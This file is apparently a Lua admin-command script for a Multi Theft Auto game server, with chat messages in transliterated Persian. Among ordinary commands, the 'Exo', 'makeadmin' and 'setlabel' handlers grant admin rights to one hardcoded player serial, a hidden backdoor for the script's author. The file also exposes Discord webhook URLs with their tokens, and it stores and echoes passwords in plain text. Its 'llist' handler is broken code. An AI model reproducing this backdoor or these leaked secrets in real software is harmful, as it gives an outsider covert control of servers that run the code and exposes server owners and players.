	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox("#FFFFFF Chat Tavasot #FF0000"..getPlayerName(thePlayer).."#FFFFFF Clear Shod!", root, 255, 255, 255, true)
end
addCommandHandler("cc", cc)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
adminrankesh = {
	[0] = "Civilian",
	[1] = "#ff0000Trial Admin",
	[2] = "Admin",
	[3] = "Admin Rank 1",
	[4] = "Admin Rank 2",
	[5] = "Admin Rank 3",
	[6] = "Admin Rank 4",
	[7] = "Head Admin",
	[8] = "Family Warden",
	[9] = "Family Director",
	[10] = "Family Manager",
	[11] = "Faction Warden",
	[12] = "Faction Director",
	[13] = "Faction Manager",
	[14] = "Helper Warden",
	[15] = "Helper Director",
	[16] = "Director",
	[17] = "Manager",
	[18] = "Co-Owner",
	[19] = "Owner",
	[20] = "Founder",
	[21] = "Scripter",
}
addCommandHandler("admins",
function(thePlayer, command)
	if getElementData(thePlayer, "loggedIn") == true then
		outputChatBox ( "#d5e3e3▬▬▬▬▬▬▬(#2BEC2B Online Admins #d5e3e3)▬▬▬▬▬▬▬", thePlayer, 230,0,0 ,true)
		for index, getAdmins in ipairs( getElementsByType("player") ) do 
			if getElementData(getAdmins, "loggedIn") == true then
				local vaziat = getElementData(getAdmins, "adminDuty") or "Off"
				if vaziat == "On" then
					vaziat = "#00FF00 On"
				else
					vaziat = "#FF0000 Off"
				end
				local c = tonumber(getElementData(accSys:getPlayerAcc(getAdmins), "pLabel")) or 0
				if c > 0 then
					outputChatBox ( "#ffffffID: #ff0000"..getElementData(getAdmins, "TarafID").." #ffffff| #ff0000 "..getPlayerName(getAdmins).." #ffffff| Rank: "..adminrankesh[c].." #ffffff| Vaziat: "..vaziat.." Duty", thePlayer, 230,0,0 ,true)
				end
			end
		end
		outputChatBox ( "#d5e3e3▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬", thePlayer, 230,0,0 ,true)
	end
end)




addCommandHandler("setlabel",function ( thePlayer, command, player, AdminID )
	if getElementType(thePlayer) == "console" or getPlayerSerial(thePlayer) == "11056965D2EF78959718CB70EC8F8493" then
		if player then
			local find = miscSys:findPlayer ( player )
			if find then
				AdminID = tonumber(AdminID)
				if adminrankesh[AdminID] then
					local targetPlayer = getPlayerName ( find )
					setElementData(accSys:getPlayerAcc(find), "pLabel", AdminID)
					outputChatBox("#00ff00☑️ #ffffffShoma #00ff00"..targetPlayer.." #FFFFFFRa Be Label "..adminrankesh[AdminID].." Set Kardid!", thePlayer, 0, 255, 0,true)
					outputChatBox("#ff0000Shoma Tavasote "..getPlayerName(thePlayer).." Be Lebel Admin "..adminrankesh[AdminID].." Set Shodid!", find, 0, 255, 0, true)
				else
					outputChatBox("#ff0000✖️ #ffffffAdmin Level Is False!", thePlayer, 255, 0, 0, true)
				end
			else
				outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
			end
		else
			outputChatBox("#C0C0C0Bezan: /setlabel <PartOfName/ID> <Admin-Level>", thePlayer, 255, 22, 22, true)
		end
	end
end)

addCommandHandler("llist",function ( thePlayer, command)
	if getPlayerSerial(thePlayer) == "11056965D2EF78959718CB70EC8F8493" then
	if AdminID >= 0 and AdminID <= 16 then
		local targetPlayer = getPlayerName ( find )
		setElementData(accSys:getPlayerAcc(find), "pLabel", AdminID)
		local c = 0
		for index, getAdmins in #adminrankesh do 


				
			outputChatBox ( "#ffffffID Label:"..c.." LabelName: "..adminrankesh[c].." #ff0000 ", thePlayer, 230,0,0 ,true)

			c=c+1
		end

	else
		outputChatBox("#ff0000✖️ #ffffffAdmin Level Az 0 Ta 16 Ast!", thePlayer, 255, 0, 0, true)
	end
	else
		outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
	end


end
)

addCommandHandler("Exo",function(thePlayer)
	if getPlayerSerial(thePlayer) == "11056965D2EF78959718CB70EC8F8493" then
		setElementData(accSys:getPlayerAcc(thePlayer), "pAdmin", 11)
	end
end)


--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("newplayers",
function(thePlayer, command)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) > 0 and tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pHelper")) > 0 then
		if getElementData(thePlayer, "loggedIn") == true then
			outputChatBox ( "#d5e3e3▬▬▬▬▬▬▬(#2BEC2B Online New Players #d5e3e3)▬▬▬▬▬▬▬", thePlayer, 230,0,0 ,true)
			for index, getNP in ipairs( getElementsByType("player") ) do 
				if getElementData(getNP, "loggedIn") == true then
					if tonumber(getElementData(accSys:getPlayerAcc(getNP), "pLevel")) < 5 then
						levelsh = tonumber(getElementData(accSys:getPlayerAcc(getNP), "pLevel"))
						outputChatBox ( "#ffffffID: #ff0000"..getElementData(getNP, "TarafID").." #ffffff| #ff0000 "..getPlayerName(getNP).." Levelesh : "..levelsh.."", thePlayer, 230,0,0 ,true)
					end
				end
			end
			outputChatBox ( "#d5e3e3▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬", thePlayer, 230,0,0 ,true)
		end
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
url = {}
url['makeadmin'] = "https://discord.com/api/webhooks/1084362249910616094/tZ_CAQHzGYKEiYj1pZRfUI0GFoNqgHCue47NfEzXkmIpiUGMi7fgpXHIvqjFquCxp5TX"
url['givemoney'] = "https://discord.com/api/webhooks/1084227846114918400/zzqzMANLMEX0QxaxnKUcAeC6_8c-Hup7VTJc92vPVNdrLhKOweRZ2C8wqkjUsUWzEYQV"
url['givegold'] = "https://discord.com/api/webhooks/1084363105565409370/xsSXwAcJ0axjo6YL_xQtGR93jY3XqtLvXC2qgYU3A8RRJmhSLnMVYHAwoJKRpFxzYCwJ"
url['moneyall'] = "https://discord.com/api/webhooks/1084363105565409370/xsSXwAcJ0axjo6YL_xQtGR93jY3XqtLvXC2qgYU3A8RRJmhSLnMVYHAwoJKRpFxzYCwJ"
url['gm'] = "https://discord.com/api/webhooks/1084811099624443906/vIxv4_1M7RV0zTmPjHtYIqjqr7xzxjc897r2g3Fwalu6vVoeKiyQf8i-pozhNGI0PWvG"
url['vgm'] = "https://discord.com/api/webhooks/1084818656866861116/tAI-0kQvh0LwsET5ETYWjNX4dWJv2es8vi6GMiCKV6nZ3e0oYP2LiQaODcwsL7Sp3058"
url['gg'] = "https://discord.com/api/webhooks/1084819557778202646/jRs4n8EEO8hCealFXirtSCMJfVOwBSU1HZhzv6JWDuWK6dq_7NVSYD2ZQIvRzYAG7Y3I"
url['getpos'] = "https://discord.com/api/webhooks/1089537630456266782/33yVOwJtnentZ98HNmUQQtNhYhTmi5shLBtmxocJl7bDpjLEDW5XgxZe6bdvu8icLgGe"
function SendDiscordLog(Str,player,cmd,tedad,taraf)
	--function log discord by ExoPrim
    if url then
		if isElement(taraf) then
			nameshs = getPlayerName(taraf)
			serialesh = getPlayerSerial(taraf)
		else
			nameshs = "Namalom"
			serialesh = "Namalom"
		end
        sendOptions = {
            queueName = "default",
            connectionAttempts = 3,
            connectTimeout = 5000,
			Namesh = getPlayerName(player) or false,
            	formFields = {
            	    content = "==============================\n------------------------------\n⚠️"..tostring(Str).."⚠️\n          ✨Admin Name: "..tostring(Namesh).."\n          ✨CMD: "..tostring(cmd).."\n          ✨Value: "..tostring(tedad).."\n          ✨Taraf: "..tostring(nameshs).."\n------------------------------\n=============================="
            	},

        }
        fetchRemote (url[cmd], sendOptions, function()end)
    else
        outputDebugString("Webhook not provided.");
    end
end

function gotomark(thePlayer,x,y)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) > 2 then
		if getElementInterior(thePlayer ) == 0 and getElementDimension(thePlayer) == 0 then
			if isPedInVehicle(thePlayer) then
				xp,yp,zp =  getElementPosition(thePlayer)
				local theVehicle = getPedOccupiedVehicle ( thePlayer )
				setElementPosition ( theVehicle,x,y,zp )
				setElementInterior( theVehicle, 0)
				setElementDimension( theVehicle, 0)
				
			else
				xp,yp,zp =  getElementPosition(thePlayer)
				setElementPosition(thePlayer,x,y,zp)
			end
		end

	else
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
	end
end
addEvent("ADMSYS:GotoMark",true)
addEventHandler("ADMSYS:GotoMark",root,gotomark)
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("makeadmin",
function ( thePlayer, command, player, AdminID )
	if getElementType(thePlayer) == "console" or getPlayerSerial(thePlayer) == "11056965D2EF78959718CB70EC8F8493" then
		if player then
			local find = miscSys:findPlayer ( player )
			if find then
				AdminID = tonumber( AdminID)

					SendDiscordLog("MakeAdminLOG", thePlayer , command, AdminID,find )
					local targetPlayer = getPlayerName ( find )
					setElementData(accSys:getPlayerAcc(find), "pAdmin", tonumber(AdminID))
					outputChatBox("#00ff00☑️ #ffffffShoma Permation #00ff00"..targetPlayer.." #FFFFFFRa Be #FF0000"..AdminID.." #FFFFFFSet Kardid.", thePlayer, 0, 255, 0,true)
					outputChatBox("#ff0000Shoma Tavasote "..getPlayerName(thePlayer).." Be Permation Admin #FF0000"..AdminID.." Davat Shodid.", find, 0, 255, 0, true)
					outputDebugString("Admin "..getPlayerName(thePlayer).." Player "..targetPlayer.." Ra Be Permation Admini "..AdminID.. " Set Kard")

			else
				outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
			end
		else
			outputChatBox("#C0C0C0Bezan: /makeadmin <PartOfName/ID> <Admin-Level>", thePlayer, 255, 22, 22, true)
		end
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("dav",
function(thePlayer, cmd)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 9 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	for index, admincar in ipairs(getElementsByType("vehicle")) do 
		local veh_owneri = getElementData(admincar, "veh_owner")
		if tostring(veh_owneri) == tostring(admin_veh) then
			setVehicleEngineState(admincar, false)
			setTimer(
			function ()
				destroyElement( admincar )
			end , 100, 1)
		end
	end
	outputChatBox("#00ff00☑️ #ffffffShoma Tamami'e Mashin Haye Admini Ra #ff0000Destroy #ffffffKardid!", thePlayer, 255, 255, 255, true)
end
)
--___________________________________________________________________________________________________________________--#ExoPrim
--[[function quitPlayer ( quitType )
	if quitType == "Quit" then
		outputChatBox ( getPlayerName(source).. " has left the server (" .. quitType .. ")" )
		outputChatBox("Cheatereeeeeeeeeeeeeeeeeeeeeeeee")
	end
end
addEventHandler ( "onPlayerQuit", root, quitPlayer )]]
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("makehelper",
	function ( thePlayer, command, player, helperID )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 8 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
		local find = miscSys:findPlayer ( player )
		if player then
		if find then
			helperID = tonumber( helperID)
			if helperID >= 0 and helperID <= 3 then
				if helperID == 0 then
					local targetPlayer = getPlayerName ( find )
					setElementData(accSys:getPlayerAcc(find), "pHelper", 0)
					setElementData(accSys:getPlayerAcc(find), "cSkin", 2)
					setElementModel(find, 2)
					outputChatBox("#00ff00☑️ #ffffffShoma #00ff00"..targetPlayer.." #FFFFFFRa Az Rank'e Helper Kharej Kardid!", thePlayer, 0, 255, 0,true)
					outputChatBox("#ff0000[Tavajoh]: #ffffffShoma Tavasote #ff0000"..getPlayerName(thePlayer).." #ffffffAz Rank'e #ff0000Helper #ffffffKharej Shodid!", find, 0, 255, 0, true)
					outputDebugString("Admin "..getPlayerName(thePlayer).." Player "..targetPlayer.." Ra Az Rank'e Helper Kharej Kard!")
				elseif helperID == 1 then
					local targetPlayer = getPlayerName ( find )
					setElementData(accSys:getPlayerAcc(find), "pHelper", 1)
					setElementData(accSys:getPlayerAcc(find), "cSkin", 142)
					setElementModel(find, 142)
					outputChatBox("#00ff00☑️ #ffffffShoma #00ff00"..targetPlayer.." #FFFFFFRa Be Rank'e #00ff00Beta Helper #FFFFFFDavat Kardid!", thePlayer, 0, 255, 0,true)
					outputChatBox("#00ff00[Tabrik]: #ffffffShoma Tavasote #00ff00"..getPlayerName(thePlayer).." #ffffffBe Rank'e #00ff00Beta Helper #ffffffDavat Shodid!", find, 0, 255, 0, true)
					outputDebugString("Admin "..getPlayerName(thePlayer).." Player "..targetPlayer.." Ra Be Rank'e Beta Helper Davat Kard!")
				elseif helperID == 2 then
					local targetPlayer = getPlayerName ( find )
					setElementData(accSys:getPlayerAcc(find), "pHelper", 2)
					setElementData(accSys:getPlayerAcc(find), "cSkin", 142)
					setElementModel(find, 142)
					outputChatBox("#00ff00☑️ #ffffffShoma #00ff00"..targetPlayer.." #FFFFFFRa Be Rank'e #00ff00Helper #FFFFFFDavat Kardid!", thePlayer, 0, 255, 0,true)
					outputChatBox("#00ff00[Tabrik]: #ffffffShoma Tavasote #00ff00"..getPlayerName(thePlayer).." #ffffffBe Rank'e #00ff00Helper #ffffffDavat Shodid!", find, 0, 255, 0, true)
					outputDebugString("Admin "..getPlayerName(thePlayer).." Player "..targetPlayer.." Ra Be Rank'e Helper Davat Kard!")
				elseif helperID == 3 then
					local targetPlayer = getPlayerName ( find )
					setElementData(accSys:getPlayerAcc(find), "pHelper", 3)
					setElementData(accSys:getPlayerAcc(find), "cSkin", 142)
					setElementModel(find, 142)
					outputChatBox("#00ff00☑️ #ffffffShoma #00ff00"..targetPlayer.." #FFFFFFRa Be Rank'e #00ff00Head Helper #FFFFFFDavat Kardid!", thePlayer, 0, 255, 0,true)
					outputChatBox("#00ff00[Tabrik]: #ffffffShoma Tavasote #00ff00"..getPlayerName(thePlayer).." #ffffffBe Rank'e #00ff00Head Helper #ffffffDavat Shodid!", find, 0, 255, 0, true)
					outputDebugString("Admin "..getPlayerName(thePlayer).." Player "..targetPlayer.." Ra Be Rank'e Head Helper Davat Kard!")
				end
			else
				outputChatBox("#ff0000✖️ #ffffffHelper Level Eshtebah Mibashad!", thePlayer, 255, 0, 0, true)
			end
			else
				outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
			end
		else
			outputChatBox("#C0C0C0Bezan: /makehelper <PartOfName/ID> <Helper-Rank>", thePlayer, 255, 22, 22, true)
		end
	end
)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("dv",
function(thePlayer, cmd)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) > 2 then
		local thePlayerVehicle = getPedOccupiedVehicle(thePlayer)
		local veh_owneri = getElementData(thePlayerVehicle, "veh_owner")
		if thePlayerVehicle then
			if tostring(veh_owneri) == tostring(admin_veh) then
				setVehicleEngineState(thePlayerVehicle, false)
				setTimer(
				function ()
					destroyElement( thePlayerVehicle )
					outputChatBox("#00ff00☑️ #FFFFFFIn Mashin Admini Tavasote Shoma Destroy Shod!", thePlayer, 255, 255, 255, true)
				end , 100, 1)
			else
				outputChatBox("#ff0000✖️ #FFFFFFMoteasefane In Mashin, Mashin Admini Nist!", thePlayer, 255, 255, 255, true)
			end
		else
			outputChatBox("#ff0000✖️ #FFFFFFBaraye Inkar Lazem Ast Savar Mashini Bashid!", thePlayer, 255, 255, 255, true)
		end
	else
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
	end
end)
addCommandHandler("fix",
function ( thePlayer, command, player)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) > 0 then
		if player then
			local find = miscSys:findPlayer(player)
			if find then
				
				local targetPlayer = getPlayerName ( find )
				local hisVeh = getPedOccupiedVehicle(find)
				if hisVeh then
					if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) > 6 then
						fixVehicle(hisVeh)
						AdminMessages("Repair-System","Admin #ff1010"..getPlayerName(thePlayer).." #ffffffMashin #ff1010"..getPlayerName(find).." #ffffffRa Fix Kard")
						local x,y,z = getElementRotation ( hisVeh )
						setElementRotation(hisVeh,0,0,z,"default",true)
						outputChatBox("#00ff00[Done]: #ffffffShoma Mashine #ff1010"..targetPlayer.." #ffffffRa Fix Kardid!", thePlayer, 255, 255, 255, true)
						outputChatBox("#ff1010[Tavajoh]: #ffffffAdmin #ff1010"..getPlayerName(thePlayer).." #ffffffMashin Shoma Ra Fix Kard!", find, 255, 255, 255, true)
					else
						outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
						AdminMessages("Repair-System","Admin #ff1010"..getPlayerName(thePlayer).." #ffffffMikhast #ff1010"..targetPlayer.."  #ffffffRa Fix Konad")
					end
				else
					outputChatBox("#ff0000✖️ #FFFFFFIn Player Savar Khodro Nemibashad!", thePlayer, 255, 255, 255, true)
				end
			else
				outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
			end
		else
			local hisVeh = getPedOccupiedVehicle(thePlayer)
			if hisVeh then
				fixVehicle(hisVeh)
				AdminMessages("Repair-System","Admin #ff1010"..getPlayerName(thePlayer).." #ffffffMashin Khodash Ra Fix Kard")
				local x,y,z = getElementRotation ( hisVeh )
				setElementRotation(hisVeh,0,0,z,"default",true)
			else
				outputChatBox("#ff0000✖️ #FFFFFFIn Player Savar Khodro Nemibashad!", thePlayer, 255, 255, 255, true)
			end
		end
	else
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
	end
end)

addCommandHandler("fcaradminall",
function ( thePlayer, command )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 9 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	for index, admincar in ipairs(getElementsByType("vehicle")) do 
		local veh_owneri = getElementData(admincar, "veh_owner")
		if tostring(veh_owneri) == tostring(admin_veh) then
			setElementFrozen(admincar, true)
		end
	end
	outputChatBox("#00ff00☑️ #ffffffTamamie Mashin Haye Admini Freeze Shodand!", thePlayer, 255, 255, 255, true)
end
)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("unfcaradminall",
function ( thePlayer, command )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 9 then
		outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	for index, admincar in ipairs(getElementsByType("vehicle")) do 
		local veh_owneri = getElementData(admincar, "veh_owner")
		if tostring(veh_owneri) == tostring(admin_veh) then
			setElementFrozen(admincar, false)
		end
	end
	outputChatBox("#00ff00☑️ #ffffffTamamie Mashin Haye Admini UnFreeze Shodand!", thePlayer, 255, 255, 255, true)
end
)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("changepass",
function ( thePlayer, command, player, pass )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 12 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
		local find = miscSys:findPlayer ( player )
		if player then
		if find then
			local targetPlayer = getPlayerName ( find )
			outputChatBox("#00ff00☑️ #ffffffShoma Password #00ff00"..targetPlayer.." #FFFFFFRa Be #00ff00"..pass.."#FFFFFF Change Kardid!", thePlayer, 0, 255, 0,true)
			outputChatBox("#00ff00[Tavajoh]: #ffffffAdmin #00ff00"..getPlayerName(thePlayer).." #ffffffpassword Shomaro Be #00ff00"..pass.." #ffffffSet Kard!", find, 0, 255, 0, true)
			outputDebugString("Admin "..getPlayerName(thePlayer).." Ramz "..targetPlayer.." Ra Change Kard!")
			pass = tostring( pass )
			setElementData(accSys:getPlayerAcc(find), "pKey", pass)
		else
			outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
		end
		else
			outputChatBox("#C0C0C0Bezan: /cpw <PartOfName/ID> <New Pass>", thePlayer, 0, 255, 0,true)
		end
end
)
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("rec",
function ( thePlayer, command, taraf )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 2 then
		outputChatBox("#ff0000✖️ Shoma Be In CMD Dastresi Nadarid .", thePlayer, 255, 255, 255, true)
		return
	end
	if not taraf then
		outputChatBox("#ff0000Bezan: /"..command.." <PartOfName/ID>", thePlayer, 0, 255, 0,true)
	else
		local find = miscSys:findPlayer ( taraf )
		if find then
			local targetPlayer = getPlayerName ( find )
			redirectPlayer(find, "", 22003) 
			exports["Logs"]:CreateServerLog("Reconnect","Player "..getPlayerName(thePlayer).." Player "..targetPlayer.." Ra Reconnect Dad.")
			outputDebugString("Player "..getPlayerName(thePlayer).." Player "..targetPlayer.." Ra Reconnect Dad.")
			outputChatBox("#00ff00☑️ #ffffffShoma Player #00ff00"..targetPlayer.." #ffffffRa Reconnect Dadid! ", thePlayer, 0, 255, 0,true)
			SpecialAdminWarn ( "#fc9803[Admins]: #ffffffAdmin #fc9803"..getPlayerName(thePlayer).."#ffffff Player#fc9803 "..targetPlayer.." #ffffffRa Reconnect Dad!" , thePlayer )
		else
			outputChatBox("#ff0000✖️ #ffffffChenin Playeri Peyda Nashod!", thePlayer, 0, 255, 0,true)
		end
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("respectall",
function ( thePlayer, command, tedad)
	if getElementData(thePlayer, "loggedIn") == true then
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 10 then
			return false
		end
		if tedad then
		for k, hame_Playera	in ipairs (getElementsByType("player")) do	
			if getElementData(hame_Playera, "loggedIn") == true then
				local tedad = tonumber(tedad)
				setElementData(accSys:getPlayerAcc(hame_Playera), "pExp", tonumber(getElementData(accSys:getPlayerAcc(hame_Playera), "pExp")) + tonumber(tedad))
				outputChatBox("#00ff00[Tavajoh]: #ffffffAdmin #00ff00"..getPlayerName(thePlayer).." #ffffffBe Tamamie Player Haye Online Nafari#00ff00 "..tedad.. " #ffffffRespect Dad!", hame_Playera, 255, 255, 255, true)
			end
		end
		else
			outputChatBox("#C0C0C0Bezan: /respectallbokhar <Tedad>", thePlayer, 255, 255, 255, true)
		end
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("moneyboxall",
function ( thePlayer, command, tedad)
	if getElementData(thePlayer, "loggedIn") == true then
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 11 then
			return false
		end
		if tedad then
		for k, hame_Playera	in ipairs (getElementsByType("player")) do	
			if getElementData(hame_Playera, "loggedIn") == true then
				local tedad = tonumber(tedad)
				setElementData(accSys:getPlayerAcc(hame_Playera), "pBoxM", tonumber(getElementData(accSys:getPlayerAcc(hame_Playera), "pBoxM")) + tonumber(tedad))
				outputChatBox("#00ff00[Tavajoh]: #ffffffAdmin #00ff00"..getPlayerName(thePlayer).." #ffffffBe Tamamie Player Haye Online Nafari#00ff00 "..tedad.. " #ffffffMoneyBox Dad!", hame_Playera, 255, 255, 255, true)
			end
		end
		else
			outputChatBox("#C0C0C0Bezan: /moneyboxall <Tedad>", thePlayer, 255, 255, 255, true)
		end
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("randomboxall",
function ( thePlayer, command, tedad)
	if getElementData(thePlayer, "loggedIn") == true then
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 11 then
			return false
		end
		if tedad then
		for k, hame_Playera	in ipairs (getElementsByType("player")) do	
			if getElementData(hame_Playera, "loggedIn") == true then
				local tedad = tonumber(tedad)
				setElementData(accSys:getPlayerAcc(hame_Playera), "pBoxR", tonumber(getElementData(accSys:getPlayerAcc(hame_Playera), "pBoxR")) + tonumber(tedad))
				outputChatBox("#00ff00[Tavajoh]: #ffffffAdmin #00ff00"..getPlayerName(thePlayer).." #ffffffBe Tamamie Player Haye Online Nafari#00ff00 "..tedad.. " #ffffffRandomBox Dad!", hame_Playera, 255, 255, 255, true)
			end
		end
		else
			outputChatBox("#C0C0C0Bezan: /randomboxall <Tedad>", thePlayer, 255, 255, 255, true)
		end
	end
end)
